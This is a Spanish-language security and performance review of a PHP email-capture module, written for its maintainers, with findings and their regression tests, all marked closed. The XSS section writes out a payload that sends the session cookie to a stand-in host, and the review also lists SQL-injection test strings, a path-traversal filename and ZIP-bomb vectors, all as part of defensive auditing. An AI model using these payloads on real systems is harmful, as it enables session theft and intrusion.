# Revisión del módulo de Correo

**Escrito para:** quien mantiene Nexo Fiscal (Fabián y quien herede el código).
Rendimiento, concurrencia, memoria, escalabilidad y seguridad de la captura de
comprobantes desde el buzón: la sincronización del índice
(`app/helpers/CorreoSync.php`, `app/models/CorreoIndice.php`), el cliente IMAP
(`app/helpers/MailFetcher.php`), el modo Descargas (`app/models/CorreoLote.php`),
la captura automática (`app/helpers/EntradaAutomatica.php`,
`app/models/CorreoCapturaAutomatica.php`), el controlador
(`app/controllers/CorreoController.php`, 3 946 líneas), la vista
(`app/views/correo/index.php`) y los dos `cli/` que lo mueven sin el módulo
abierto (`cli/sync_correo.php`, `cli/procesar_lotes.php`).

Cada hallazgo lleva un código (`P1`, `L2`, `S3`, `C1`, `M3`…). Casi todos tienen
una prueba que los reproduce, marcada como **DEFECTO ABIERTO** mientras el
defecto vive: el día que se arregla, la prueba falla sola y hay que ascenderla
de `defecto()` a `caso()`. Así esta lista no puede mentir. La convención es la
misma de `docs/REVISION_SEGUIMIENTO.md` y el arnés se comparte de raíz
(`tests/soporte/CorreoSoporte.php`, gemelo de `SeguimientoSoporte.php`).

## Estado al 2026-09-15

De los 23 defectos con prueba, **los 23 están cerrados** y sus pruebas pasaron
de `defecto()` a `caso()` (conservan el código en el nombre: `[S1] …`). El resto
de este documento es el análisis original, sin reescribir: describe cómo estaban
las cosas y por qué había que cambiarlas.

| Código | Estado | Cómo quedó |
|---|---|---|
| S1 / S2 | Cerrado | `JSON_HEX_TAG \| JSON_HEX_AMP` en los dos `json_encode` de la vista (carpetas y lote). El nombre de una carpeta ya no puede cerrar el `<script>`. |
| S3 | Cerrado | `generalProcesar` resuelve el lote con `loteDeLaSociedad()` y responde 404 antes de tocar nada. El worker de `cli/` sigue llamando a `procesarTandaLote()` directo, que es lo correcto. |
| S4 | Cerrado | `descartarIncidencias`/`restaurarIncidencias` escriben con `UPDATE … JOIN correo_lotes` acotado por buzón y por empresa (`alcanceIncidencias`), y devuelven lo que de verdad cambió. El JOIN va dentro de la escritura para no dejar hueco entre comprobar y escribir. |
| S5 | Cerrado | `extraerDeZip()` mira `statIndex()['size']` **antes** de descomprimir: tope de 100 archivos, 10 MB por archivo y 25 MB por ZIP. Lo que se salta queda como aviso del mensaje y el lote lo anota como incidencia (`adjunto_descartado`). |
| S6 | Cerrado | `app/helpers/Secreto.php`: AES-256-GCM con clave fuera de la base (`app/config/local.clave.php`, que no se versiona). Lo guardado en base64 se sigue leyendo, y `cli/cifrar_claves_correo.php` lo pasa al formato nuevo. `Model::logError` ya no vuelca los parámetros de una consulta que lleve credenciales. **Requiere copiar `local.clave.php` a todas las computadoras.** |
| S7 | Cerrado | `responderFallo()`: los rechazos de la aplicación se muestran (422) y lo demás va al log con un 500 genérico. Mismo criterio que `SeguimientoController`. |
| S9 | Cerrado | `addcslashes(…, '%_\\')` también en el buscador del historial de incidencias. |
| C1 | Cerrado | `tomarPendientes()` firma la toma (`tomado_por`, migración 008) y relee solo lo suyo; si el `UPDATE` no afectó ninguna fila, devuelve vacío. Dos máquinas ya no se llevan los mismos correos. |
| C2 | Cerrado | `procesarTandaLote()` llama a `$fetcher->usarSociedad($lote['sociedad_id'])`: la marca de procesado es siempre de la empresa del lote, con o sin sesión. |
| C3 | Cerrado | `marcarImportadas`/`marcarDescartadas` exigen el estado esperado y devuelven las filas afectadas; `descartar()` borra los archivos solo de las filas que ese descarte se llevó. |
| P1 | Cerrado | `finalizarItem()` ya no recalcula; el cierre de la tanda lo hace una vez (`cerrarTanda()`). De 59 sentencias para 10 correos a lo que cuesta la tanda. |
| P2 | Cerrado | `CorreoIndice::terminosBusqueda()`: como mucho 8 términos, los más largos. Pegar un correo entero ya no arma 2 700 `LIKE`. |
| M3 | Cerrado | `CorreoProcesado::deClaves()`: se preguntan las claves de la página (`clave IN (…)`), no la tabla entera de la empresa. |
| M4 | Cerrado | `getActivas()` con `LIMIT` (500 por omisión). Los contadores de `contarPorEstado()` siguen diciendo cuántas hay en total. |
| L1 | Cerrado | Fuera las 50 líneas inalcanzables de `importar()`. Archivar el par renombrado es trabajo de `XmlDocumentImporter` desde que existe el archivo por mes. |
| L2 | Cerrado | `checkdate()` en el índice y en el rango de la descarga masiva: el 30 de febrero se rechaza en vez de correrse a marzo. |
| L3 | Cerrado | La deduplicación mira la numeración del buzón (UIDVALIDITY): misma carpeta, segundo y asunto con la **misma** numeración son correos distintos (una ráfaga de facturación); con numeraciones distintas es el mismo correo reindexado. |
| L4 | Cerrado | `enmascararUsuario()` tapa siempre, con arroba o sin ella. |
| L6 | Cerrado | La página se acota a la última contra el total del índice antes de consultar. |
| L7 | Cerrado | `CorreoLote::crear()` valida el correo de búsqueda antes de insertar nada. |
| L8 | Cerrado | Un puerto vacío, 0 o fuera de rango guarda 993. |

**Lo que hay que hacer al desplegar:**

1. `php cli/clave_secretos.php` en una computadora y copiar el
   `app/config/local.clave.php` que crea a las demás (S6). Mientras no esté,
   guardar o cambiar la contraseña de un buzón falla con ese mensaje; las
   cuentas que ya existen siguen funcionando.
2. `php cli/cifrar_claves_correo.php` una vez, para que las contraseñas que
   están en base64 pasen al formato cifrado (S6).
3. `database/migrations/008_correo_lote_tomado_por.sql` si el usuario de la
   base que usa la aplicación no puede alterar tablas (C1); si puede, la
   columna se agrega sola al abrir el módulo.

**No medido contra la base de producción.** La base viva está en otra
computadora (AUXILIAR-06C, puerto 3307) y la de certificación no conecta
(`auth_gssapi`, ver la memoria del proyecto), así que **ninguna** de estas
pruebas toca una base real: la conexión de `Model` es una PDO falsa que graba lo
que se le pide, el buzón es un `MailFetcher` sin IMAP y el índice de la
sincronización vive en memoria. Los conteos de sentencias que aparecen abajo son
exactos (no dependen de la red); los tiempos son ese conteo multiplicado por
~90 ms, no una medición.

## Cómo se probó

- PHP 8.4.24 (el de producción, `C:\WebServer\PHP84\php.exe`), con
  `error_reporting=E_ALL` y `display_errors=1`, igual que el certificador.
- Los avisos de PHP se convierten en excepciones (como hace `App` en desarrollo):
  producción los calla, así que un `Undefined array key` puede "funcionar" allá
  por casualidad y reventar en cualquier copia de desarrollo.
- Comportamientos del entorno **sondeados**, no supuestos: `libxml 2.11.9` no
  expande entidades externas por defecto (XXE cerrado), `imap_mutf7_to_utf8`
  sobre `INBOX.<.script>` devuelve `</script>` literal (de ahí S1),
  `mb_convert_encoding` con un charset inventado lanza `ValueError` (por eso
  `convertirAUtf8` lo atrapa), y una fila de overview ocupa ~1 KB en memoria.
- El candado entre procesos de una misma máquina no se re-prueba aquí: ya lo
  cubre `CorreoCandadoCuentaTest` con procesos de verdad (flock se comporta
  distinto entre dos manijas del mismo proceso).

---

## 1. Rendimiento y escalabilidad

Este módulo no reconstruye una unión cara en cada pantalla como Seguimiento; su
costo está en **los viajes**: al servidor de correo (105 ms contra `mail.bm.cr`,
según las mediciones anotadas en el propio código) y a la base (~85–100 ms, al
otro lado de la red). La arquitectura ya reconoce esto y está, en general, bien
pensada: índice local buscable, sincronización incremental, ritmos por carpeta
(`RitmoCarpetas`), varias copias del sincronizador repartiéndose los buzones por
candado, conexión IMAP reutilizada entre tandas, `Esquema::unaVez` para no
preguntar el esquema en cada carga. Lo que sigue son las fugas que quedan.

### P1 — El modo Descargas recalcula el lote una vez por correo

`procesarTandaLote()` llama a `finalizarItem()` por cada correo, y
`finalizarItem()` corre `recalcular()` **y** `completarSiTermino()`.
`recalcular()` es un `UPDATE correo_lotes` con **cinco subconsultas**
(`COUNT`, tres `SUM`, un `COUNT` de incidencias) sobre `correo_lote_items`.
Cada `incidencia()` vuelve a llamarlo. Medido con la PDO falsa: **10 correos sin
un solo adjunto → 59 sentencias**, ~5,9 por correo. Con la base al otro lado de
la red, eso es ~0,5 s de pura espera por correo *antes* de bajar ningún XML.

**Optimización, paso a paso:**
1. Recalcular **una vez al final de la tanda**, no por item. Los estados de los
   items ya están escritos; el agregado del lote puede esperar al cierre del
   `foreach`.
2. `completarSiTermino()` solo tiene sentido cuando la tanda no devolvió items
   (ya lo hace `tomarPendientes()` en ese caso): sacarlo de `finalizarItem()`.
3. Las incidencias no necesitan recalcular el lote en el acto; el contador
   `incidencias` puede subir con el mismo recálculo final.

### P2 — La búsqueda multiplica los `LIKE` sin tope

`CorreoIndice::buscar()` parte el texto en términos por espacios y, por cada
término, agrega un grupo de hasta cinco `LIKE '%…%'` (asunto, remitente, cc,
reply_to, adjuntos). No hay tope de términos, y el `COUNT` y la página arman el
grupo cada uno. Medido: pegar un cuerpo de correo (540 palabras) → **2 700
`LIKE`**, 48 KB de SQL, dos veces. Ninguno usa índice (`%…%` no es
prefijo).

**Arreglo:** acotar a los primeros N términos significativos (p. ej. 8), y
descartar los de menos de 2–3 caracteres. Para búsquedas por número ya existe el
camino rápido (`buscarPorNumero`, por `consecutivo`/`numero_corto` con B-Tree);
esto es solo para la búsqueda de texto libre.

### P3 — La sincronización ya está bien; lo que falta es la tarea

`RitmoCarpetas` es el trabajo de fondo bien hecho: en el buzón real baja la
vuelta de 106 carpetas a 26, y una carpeta de archivo se pregunta una vez por
hora en vez de doce. Las pruebas lo confirman (`CorreoRendimientoTest`: 100
carpetas de archivo vistas hace 10 min → **cero** viajes). No hay nada que
optimizar aquí; el riesgo es operativo: si la tarea programada de Windows no
está instalada en la máquina que corre Apache, nada de esto se ejecuta con el
módulo cerrado. Igual que P2 en Seguimiento, conviene **verificar que la tarea
exista** (el ⚙ ya lo muestra con `tareaSyncInstalada()`).

---

## 2. Concurrencia

Es un módulo de varios frentes a la vez sobre la misma base: la aplicación en la
PC de cada persona, dos tareas programadas (`sync_correo`, `procesar_lotes`) y
el latido del navegador desde cualquier pantalla. Los candados de archivo
(`sync_cuenta_*.lock`, `lotes.lock`) ordenan a los procesos de **una** máquina.
Entre máquinas, solo la base ordena — y ahí están las grietas.

### C1 — Dos máquinas pueden bajar el mismo lote *(prueba: `…ConcurrenciaTest`)*

`lotes.lock` es local (lo dice su propio comentario: "un motor por máquina, no
uno en toda la oficina"). `tomarPendientes()` marca los items con
`UPDATE … SET 'procesando' … WHERE id IN (…) AND estado = 'pendiente'` y
**después** los relee con `SELECT … WHERE id IN (…)` **sin** mirar quién ganó el
`UPDATE`. Si otra máquina se los llevó (0 filas afectadas), el `SELECT` se los
entrega igual, y los dos frentes bajan e importan los mismos correos.

**Arreglo:** releer solo los que **este** proceso marcó
(`… WHERE id IN (…) AND estado = 'procesando' AND intentos = …`, o devolver los
ids realmente afectados). El mismo patrón atómico que ya usa
`CorreoCapturaAutomatica::tomarPendientes()` con `FOR UPDATE` (esa sí está bien;
la prueba lo confirma).

### C2 — El trabajador de lotes marca con la empresa equivocada *(prueba: `…ConcurrenciaTest`)*

`cli/procesar_lotes.php` corre sin sesión y arma la conexión con
`CorreoCuenta::configPara()`, que resuelve `sociedad_id` como "la empresa en
curso" → sin sesión, la primera activa. Al terminar un correo,
`marcarProcesado()` usa esa empresa, no la del lote. Resultado: la empresa del
lote no ve la marca y vuelve a bajar el correo en su próxima corrida, y la
primera lo da por procesado sin haberlo trabajado. El latido del navegador **sí**
marca bien (tiene sesión con la empresa del lote); la prueba cubre los dos
caminos.

**Arreglo:** `procesarTandaLote()` ya conoce `$lote['sociedad_id']`; la marca de
procesado debe usar **esa** empresa, no la de la sesión. Es el mismo criterio que
`configCuenta($id, $validarSociedad = false)` ya aplica para la conexión.

### C3 — Importar y descartar la misma fila sin candado *(prueba: `…ConcurrenciaTest`)*

`marcarImportadas()` y `marcarDescartadas()` escriben `WHERE id IN (…)` sin
condición de estado. Ana importa y Beto descarta la misma factura a la vez: gana
el último `UPDATE`. Si gana "importada" después de que "descartada" borró el XML
y el PDF y desmarcó el correo, queda una fila importada que apunta a archivos que
ya no existen.

**Arreglo:** condicionar por el estado esperado
(`… WHERE id IN (…) AND estado = 'pendiente'`) y actuar según las filas
afectadas. Es el mismo arreglo que C1 de Seguimiento pide para su `upsert`.

### Lo que ya está bien

- El candado por buzón del sincronizador (lectores/escritores con `flock`):
  probado con procesos reales en `CorreoCandadoCuentaTest`.
- La cola de captura automática: `FOR UPDATE` dentro de la transacción, rescate
  de los `procesando` colgados a los 20 min, reintento escalonado (5→60 min).
- El estado del ⚙ se **funde** en vez de pisarse (cada trabajador escribe solo
  sus cuentas): correcto para varias copias a la vez.

---

## 3. Memoria

El `memory_limit` es 512 MB (CLI y web). Los riesgos:

### M3 — Todas las marcas de procesado en memoria por búsqueda

`MailFetcher::cargarProcesados()` hace `SELECT clave, procesado_en FROM
correo_procesados WHERE sociedad_id = ?` **entero** la primera vez que se
pregunta `yaProcesado()`, y `listarMensajes()` pregunta por cada correo listado.
Medido: 100 000 marcas = 10,6 MB, y crece sin techo. Hoy no duele porque el
listado por índice no llama a `yaProcesado()`; sí lo llama la búsqueda IMAP
directa (`ambito=todo` o carpeta sin indexar).

**Arreglo:** preguntar solo por las claves de la página
(`… WHERE sociedad_id = ? AND clave IN (…)`), como ya hace `desmarcar()`.

### M4 — La bandeja sin tope

`getActivas()` trae **todas** las filas `pendiente`/`rechazada`/`otra_cedula` sin
`LIMIT`, y la vista las pinta todas. Con la entrada automática, lo rechazado por
Hacienda y de otra cédula se queda ahí para siempre: es una lista que solo crece.

**Arreglo:** `LIMIT` con paginación, o al menos separar "lo que hay que hacer"
(pendiente) de "el archivo de descartes" (rechazada/otra_cedula) con su propio
tope.

### M1/M2 — La búsqueda IMAP (bien acotada, se anota para el futuro)

`listarMensajes()` ya se protege: `$maxOverview = max($limite + $offset, 1500)`
recorta cuántos encabezados pide aunque haya miles de coincidencias
([MailFetcher.php:543](../app/helpers/MailFetcher.php#L543)), y el overview va por
lotes de 200. Con ~1 KB por fila (medido), 1 500 filas son ~1,5 MB: sin problema.
No es un defecto; se anota para que nadie quite ese recorte pensando que sobra.

---

## 4. Seguridad

### S1 / S2 — XSS almacenado desde el nombre de una carpeta o un buzón *(prueba: `…SeguridadTest`)*

La vista pinta bien todo lo que pasa por `htmlspecialchars` (la bandeja) y por la
función `esc()`/`escapeHtml()` del JavaScript (el expediente, las incidencias).
El hueco está en los `<script>` que serializan datos con `json_encode`:

```php
var CARPETAS_INICIALES = <?= json_encode(array_values($carpetasCorreo),
    JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) ?>;   // línea 504
var lote = <?= json_encode($loteGeneral,
    JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) ?>;    // línea 2230
```

`JSON_UNESCAPED_SLASHES` deja las barras sin escapar, así que un valor que
contenga `</script>` **cierra la etiqueta**. El nombre de una carpeta lo controla
cualquiera con acceso al buzón: crear en el webmail la carpeta `<` con subcarpeta
`script><svg onload=fetch('//evil/?c='+document.cookie)>` basta —
`nombreLegibleEstatico` convierte los puntos de la jerarquía en barras y produce
`</script><svg onload=…>` literal (sondeado, no supuesto). El nombre de un buzón
lo pone quien configura las cuentas.

**Malicioso de prueba (S1):** carpeta IMAP
`INBOX.<.script><svg onload=alert(document.cookie)>`; al abrir /correo, la
cookie de sesión sale hacia fuera.

**Arreglo:** agregar `JSON_HEX_TAG` (y por defensa `JSON_HEX_AMP`) a esos dos
`json_encode`, o escapar con `htmlspecialchars` el JSON resultante. Es el estándar
para JSON embebido en `<script>`. Barato y sin cambiar nada más.

### S6 — La contraseña del buzón en base64 *(prueba: `…SeguridadTest`)*

`CorreoCuenta` guarda `base64_encode($password)` y `configPara()` lo decodifica.
Base64 no es cifrado: quien lea la tabla, un respaldo (`storage/backups`), o el
`app.log` —donde `Model::logError` escribe los parámetros de **cualquier**
consulta fallida, contraseña incluida— la tiene en claro. El propio comentario
del modelo lo justifica ("herramienta local, la BD no sale del equipo"), pero la
base sí sale: los respaldos se copian y la memoria del proyecto los ubica en
disco.

**Arreglo:** cifrar con una clave fuera de la base (en `app/config/local.php`,
que no se versiona), `sodium_crypto_secretbox` o `openssl_encrypt` con AES-GCM.
Y **no** registrar los parámetros de las consultas a `correo_cuentas` en el log
(o enmascarar el campo `password`).

### S3 — Un lote ajeno se procesa por id *(prueba: `…SeguridadTest`)*

`generalEstado`, `generalPausar`, `generalCancelar`, `generalReanudar` pasan por
`loteDeLaSociedad()`, que comprueba la empresa. `generalProcesar` **no**: llama
directo a `procesarTandaLote($loteId)`. Un POST con el id de un lote de otra
empresa devuelve su buzón, su cédula y sus incidencias, y lo hace avanzar.

**Arreglo:** `generalProcesar` debe resolver el lote con `loteDeLaSociedad()` y
responder 404 si no es de la empresa en curso, antes de tocarlo. (El worker de
`cli/` sigue llamando a `procesarTandaLote()` directo, que es correcto: corre sin
sesión y ya trae la empresa del lote.)

### S4 — Incidencias ajenas se descartan por id *(prueba: `…SeguridadTest`)*

`descartarIncidencias([...ids])` hace `UPDATE correo_incidencias SET descartada=1
WHERE id IN (…)` sin unir con `correo_lotes` para comprobar la empresa. Mandar
ids de otro buzón los descarta. `restaurarIncidencias` igual.

**Arreglo:** acotar por la cuenta/empresa (JOIN con `correo_lotes l` y
`l.cuenta_id`/`sociedad_id`), como ya hace `idsIncidencias()` para el modo
"todas".

### S5 — Bomba ZIP *(prueba: `…SeguridadTest`)*

`extraerDeZip()` recorre `numFiles` sin tope y hace `getFromIndex($i)`, que
descomprime cada entrada **entera en memoria**. No mira `statIndex()['size']`
antes de leer, ni cuántas entradas hay, ni el ratio comprimido/descomprimido. Un
ZIP de pocos KB con una entrada de 600 MB, o con decenas de miles de XML de un
byte, tumba el proceso. Con 512 MB de límite y 4 núcleos, un correo malicioso
puede voltear la sincronización.

**Arreglo:** tope de entradas (p. ej. 200), tope de tamaño por entrada leído de
`statIndex()['size']` antes de `getFromIndex`, y tope acumulado por ZIP (p. ej.
50 MB). Descartar el ZIP con una incidencia si se pasa.

### S7 — El error de la base llega crudo al navegador *(prueba: `…SeguridadTest`)*

`generalEstimar`/`generalCrear` responden `['message' => $e->getMessage()]` con
422 ante cualquier `Throwable`. Si el que falla es PDO, el navegador recibe
`SQLSTATE… Unknown column 'x' in 'where clause'`: filtra estructura. Mismo caso
que S4 de Seguimiento.

**Arreglo:** distinguir `InvalidArgumentException` (mensaje para la persona, se
muestra) de `PDOException`/infraestructura (mensaje genérico + `registrarFallo()`
al log).

### S9 — Comodines de `LIKE` sin escapar en el historial *(prueba: `…ModelosBordeTest`)*

`historialIncidencias()` arma `'%' . $q . '%'` sin escapar `%` `_` `\`. No es
grave (da resultados raros y trabajo de más), pero el resto del módulo ya escapa
bien (`CorreoIndice::buscar`, `CorreoLote::agregarFiltroCorreo` usan
`addcslashes(…, '%_\\')`). Es coherencia.

### Inyección SQL — resistente (verificado, no es un defecto)

Se probaron 9 cargas (`' OR '1'='1'`, `; DROP TABLE`, `UNION SELECT usuario,
password FROM correo_cuentas`, byte nulo, `LOAD_FILE`, comillas en masa) contra
**todos** los modelos —índice, lotes, incidencias, bandeja, marcas, cola de
captura, cuentas— en cada texto, número, ámbito, carpeta, mes, fecha, límite y
correo, y contra la acción `listar` de punta a punta (>300 sentencias por vuelta).
**Todo viaja como parámetro preparado**; nada se interpola. Los `LIMIT/OFFSET` se
interpolan pero son enteros ya acotados. La empresa se mete como número en
`CorreoLote` (`max(0, (int) $sociedadId)`), no como texto, a propósito. Bien.

### XXE y billion laughs — resistentes (verificado)

`libxml 2.11.9` no carga entidades externas por defecto (se sondeó: una entidad
`SYSTEM "file:///…"` en un XML adjunto devuelve cadena vacía, no el archivo), y
las entidades anidadas no se expanden (parse-fail sin explotar la memoria). Tanto
`clasificarXml()` como `XmlInvoiceParser` resisten. **Mantener la regla:** no
activar `LIBXML_NOENT` en ningún `simplexml_load_*` de este módulo.

### Recorrido de rutas — resistente (verificado)

`guardarTemp()` reduce el nombre a `[A-Za-z0-9._-]` y lo ancla en
`storage/correo/tmp`; un adjunto llamado `..\..\public\shell.php` queda dentro de
tmp. Los ZIP internos pasan por `basename()`. Bien.

### CSRF y permisos — resistentes (verificado)

Las 30+ rutas POST de `/correo` declaran cada una un permiso `correo.*` real (ni
`libre` ni `pública`) en `config/permisos.php`, y el enrutador exige el token
CSRF para todo lo que no es GET. La prueba recorre las rutas del `routes.php` y
verifica que cada una tenga su regla.

---

## 5. Robustez (borde y valores nulos)

Defectos que no son de seguridad pero rompen o confunden. Casi todos con prueba.

| Código | Qué pasa | Dónde |
|---|---|---|
| `L1` | `importar()` responde con `json()` (exit) y deja 50 líneas muertas que prometían copiar el par renombrado a la carpeta destino. La segunda respuesta y el copiado nunca corren. | `CorreoController::importar` |
| `L2` | `2026-02-30` pasa el regex y `strtotime` la corre a marzo: se filtra por un rango que nadie pidió. Falta `checkdate()`. | `CorreoIndice::buscar`, `CorreoController::rangoGeneral` |
| `L3` | Una ráfaga de facturación (varias facturas en el mismo segundo, mismo asunto) se colapsa a una sola en el resultado de la búsqueda. | `CorreoController::deduplicarCorreosBusqueda` |
| `L4` | Un usuario corto (`ab@…`) o sin arroba sale sin enmascarar en el resumen de la cuenta. | `CorreoController::resumenConfig` |
| `L6` | `?pagina=10000` sobre pocos correos pide un `OFFSET` enorme al índice en vez de acotar a la última página. | `CorreoController::listar` |
| `L7` | Un correo de búsqueda inválido deja un lote huérfano: se valida después de insertar. | `CorreoLote::crear` |
| `L8` | Puerto vacío guarda `1` en vez de `993`. | `CorreoCuenta::crear` |

Lo que **sí** está bien blindado (cubierto por `caso()`, no `defecto()`): el
protocolo IMAP (`n:*` que devuelve el último aunque no haya nada, UIDVALIDITY
regenerado, carpeta que no abre, overview vacío con mensajes → error sin vaciar
el índice), la retención (corte estricto, timestamp 0/negativo/faltante), los
charsets inventados y Latin-1 sin declarar, los nombres de carpeta mUTF-7 y
vacíos, los adjuntos anidados y sin nombre, y toda la normalización de ids,
fechas y números que llega del navegador.

---

## 6. Las pruebas añadidas

Sin base de datos (dobles en memoria), corren con el certificador existente
(`scripts/verificar-php84.ps1`) y en PHP 8.4 con `error_reporting=E_ALL`. Ninguna
deja archivos en `storage/correo/tmp` ni fuera (verificado: antes=después).

| Archivo | Cubre | Casos | Defectos abiertos |
|---|---|---:|---:|
| `tests/soporte/CorreoSoporte.php` | arnés, PDO/buzón/índice falsos | — | — |
| `tests/CorreoSyncBordeTest.php` | sincronización, IMAP, retención, ritmo, ZIP, MIME | 27 | 0 |
| `tests/CorreoModelosBordeTest.php` | índice, lotes, bandeja, marcas, cuentas, captura | 35 | 0 |
| `tests/CorreoControladorBordeTest.php` | ayudantes, acciones AJAX, validaciones | 24 | 0 |
| `tests/CorreoSeguridadTest.php` | inyección SQL, XSS, IDOR, XXE, bomba ZIP, credenciales | 17 | 0 |
| `tests/CorreoConcurrenciaTest.php` | lotes entre máquinas, empresa del worker, bandeja | 8 | 0 |
| `tests/CorreoRendimientoTest.php` | viajes por correo, LIKE sin tope, memoria | 6 | 0 |

Los 23 que empezaron como `defecto()` son hoy `caso()` y llevan su código en el
nombre (`[S1] …`), así que se puede ir de esta lista al arreglo y al revés.

**Caso feliz, borde, nulos:** cubiertos en los tres primeros (carpeta nueva,
correo nuevo, nada nuevo; petición vacía, todo `null`, textos desmesurados,
fechas imposibles, y el camino completo bien formado).

**El arnés separa dos cosas** (igual que Seguimiento): un `caso()` **tiene** que
pasar; un `defecto()` afirma el comportamiento **correcto** de algo que hoy está
mal, sale como `DEFECTO ABIERTO` y no rompe la certificación. Cuando se arregle,
la prueba falla y obliga a ascenderlo a `caso()`.

Correr solo lo de Correo:
```
Get-ChildItem tests\Correo*Test.php | ForEach-Object { & C:\WebServer\PHP84\php.exe -d error_reporting=E_ALL $_.FullName }
```

---

## 7. Diez casos de un usuario exigente y caótico

Pensados como los haría alguien real trabajando a las apuradas, no como pruebas
unitarias. La mayoría tiene su defecto arriba.

| # | Lo que hace la persona | Qué debería pasar | Qué pasaba | Ref |
|---|---|---|---|---|
| 1 | En el webmail crea una carpeta llamada `<script>…` y luego abre /correo | El nombre se pinta como texto | Se ejecutaba el script; la cookie de sesión podía salir | `S1` |
| 2 | Pega el cuerpo entero de un correo (500 palabras) en el buscador | Buscar por lo principal | 2 700 `LIKE '%…%'` sin índice, dos veces | `P2` |
| 3 | Escribe `30/02/2026` en el rango de la descarga masiva | Avisar que la fecha no existe | Se corría a marzo y filtraba sin decir nada | `L2` |
| 4 | Da "Descargar" del mismo rango en su PC y en la de al lado a la vez | Cada correo se baja una vez | Los dos bajaban e importaban los mismos | `C1` |
| 5 | Importa una factura y un compañero la descarta en el mismo instante | Un solo estado coherente | Podía quedar "importada" sin sus archivos | `C3` |
| 6 | Manda el `lote_id` de otra empresa a `generalProcesar` desde la consola | 404 | Veía y hacía avanzar el lote ajeno | `S3` |
| 7 | Recibe un correo con un `facturas.zip` de 100 KB que infla a 24 MB | Descartarlo con una incidencia | Se descomprimía entero; uno mayor tumbaba el proceso | `S5` |
| 8 | Un proveedor manda tres facturas en el mismo segundo, mismo asunto | Ver las tres | La búsqueda mostraba una | `L3` |
| 9 | Salta a `?pagina=99999` desde la URL | La última página | `OFFSET 4999500` al índice | `L6` |
| 10 | Un administrador lee `storage/backups` o `app.log` | No encontrar contraseñas | La del buzón estaba en base64, reversible | `S6` |

Los diez se comportan hoy como dice la columna "qué debería pasar", y cada uno
tiene su prueba.

---

## 8. Lo que queda

Los 23 defectos de la tabla del principio están cerrados. Lo que sigue
pendiente no es un defecto con prueba, sino trabajo de otra clase:

- **La tarea programada de Windows** (`P3`). Todo el ritmo de carpetas está
  bien, pero si `XMLConcilia_SyncCorreo` no está instalada en la máquina que
  corre Apache, nada de eso se ejecuta con el módulo cerrado. El ⚙ ya lo
  muestra con `tareaSyncInstalada()`: hay que mirarlo, máquina por máquina.
- **Los tres pasos del despliegue** de la sección "Estado": la clave de
  cifrado copiada a cada computadora, las contraseñas viejas pasadas al
  formato nuevo, y la migración 008 donde el usuario de la base no pueda
  alterar tablas.
- **Medir contra la base de verdad.** Todo lo de aquí se contó con una PDO
  falsa: los números de sentencias son exactos, los tiempos son ese conteo por
  ~90 ms. Cuando la base de certificación conecte, conviene repetir P1 y P2
  contra ella y anotar el antes y el después, como se hizo en Seguimiento.
- **`M1`/`M2`** siguen sin ser defectos: el recorte de `listarMensajes()` está
  bien puesto y se anota aquí para que nadie lo quite pensando que sobra.
